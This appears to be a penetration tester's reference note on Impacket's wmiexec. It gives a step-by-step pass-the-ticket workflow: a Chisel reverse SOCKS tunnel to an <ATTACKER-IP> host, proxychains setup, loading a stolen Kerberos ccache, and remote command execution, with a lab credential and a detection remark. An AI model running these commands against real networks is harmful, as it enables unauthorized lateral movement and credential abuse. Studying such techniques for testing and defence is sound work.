---
tags:
  - PtT
---
Generates:
	[4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)

WMIexec utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules.
>Can still be detected by modern AV and EDR systems
# Example Usage
```shell-session
$ wmiexec.py Cry0l1t3:'P455w0rD!'@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```
# Pass the Ticket
To execute this attack, we need to proxy traffic via `MS01` with a tool such as [[File Transfer#Chisel|Chisel]] and #proxychains and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

```shell-session
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

- On attack host:
```shell-session
$ sudo ./chisel server --reverse
```
- On Windows host:
```cmd-session
> chisel.exe client <ATTACKER-IP>:8080 R:socks
```
- Set the environment variable `KRB5CCNAME` with the path of targeted user's ccache file:
```shell-session
$ export KRB5CCNAME=/Path/to/krb5cc_file
```
- Finally, to use the Kerberos ticket, specify the target machine name (not IP!) and use `-k`. If prompted for a password, include `-no-pass`.
```shell-session
$ proxychains impacket-wmiexec dc01 -k [-no-pass]
```

Once the Kerberos ticket (as `ccache`) is loaded and verified with [[klist]], we can perform the above command